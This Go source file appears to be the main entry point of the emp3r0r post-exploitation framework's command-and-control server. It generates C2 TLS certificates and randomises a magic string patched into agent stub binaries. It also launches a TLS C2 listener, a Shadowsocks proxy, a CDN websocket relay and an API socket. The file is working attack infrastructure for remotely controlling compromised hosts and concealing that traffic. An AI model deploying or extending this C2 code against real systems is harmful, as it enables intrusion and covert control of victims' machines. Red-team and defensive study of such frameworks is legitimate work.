//go:build linux
// +build linux

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/cc"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

func readJSONConfig(filename string) (err error) {
	// read JSON
	jsonData, err := os.ReadFile(filename)
	if err != nil {
		return
	}

	return emp3r0r_data.ReadJSONConfig(jsonData, cc.RuntimeConfig)
}

// unlock_downloads if there are incomplete file downloads that are "locked", unlock them
// unless CC is actually running/downloading
func unlock_downloads() bool {
	// is cc currently running?
	if tun.IsPortOpen("127.0.0.1", cc.RuntimeConfig.CCPort) {
		return false
	}

	// unlock downloads
	files, err := os.ReadDir(cc.FileGetDir)
	if err != nil {
		return true
	}
	for _, f := range files {
		if strings.HasSuffix(f.Name(), ".lock") {
			err = os.Remove(cc.FileGetDir + f.Name())
			if err != nil {
				log.Fatalf("Remove %s: %v", f.Name(), err)
			}
		}
	}

	return true
}

// re-generate a random magic string for this CC session
func init_magic_str() {
	default_magic_str := emp3r0r_data.OneTimeMagicBytes
	emp3r0r_data.OneTimeMagicBytes = util.RandBytes(len(default_magic_str))

	// update binaries
	files, err := os.ReadDir(cc.EmpWorkSpace)
	if err != nil {
		cc.CliFatalError("init_magic_str: %v", err)
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		if strings.HasPrefix(f.Name(), "stub-") {
			err = util.ReplaceBytesInFile(fmt.Sprintf("%s/%s", cc.EmpWorkSpace, f.Name()),
				[]byte(default_magic_str), []byte(emp3r0r_data.OneTimeMagicBytes))
			if err != nil {
				cc.CliPrintError("init_magic_str %v", err)
			}
		}
	}
}

func main() {
	var err error

	// cleanup or abort
	if !unlock_downloads() {
		log.Fatal("CC is already running")
	}

	// set up dirs
	err = cc.DirSetup()
	if err != nil {
		log.Fatal(err)
	}

	// set up magic string
	init_magic_str()

	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
	names := flag.String("gencert", "", "Generate C2 server cert with these host names")
	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	flag.Parse()

	if *names != "" {
		hosts := strings.Fields(*names)
		err := cc.GenC2Certs(hosts)
		if err != nil {
			log.Fatalf("GenC2Certs: %v", err)
		}
		err = cc.InitConfigFile(hosts[0])
		if err != nil {
			log.Fatalf("Init %s: %v", cc.EmpConfigFile, err)
		}
	}

	// read config file
	err = readJSONConfig(*config)
	if err != nil {
		log.Fatalf("Read %s: %v", *config, err)
	} else {
		go cc.TLSServer()
		go cc.ShadowsocksServer()
		go cc.InitModules()
	}

	if *cdnproxy != "" {
		go func() {
			logFile, err := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0600)
			if err != nil {
				log.Fatal(err)
			}
			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
			if err != nil {
				log.Fatal(err)
			}
		}()
	}

	err = cc.CliBanner()
	if err != nil {
		log.Fatal(err)
	}

	// use emp3r0r in terminal or from other frontend
	if *apiserver {
		go cc.APIMain()
	}
	cc.CliMain()
}
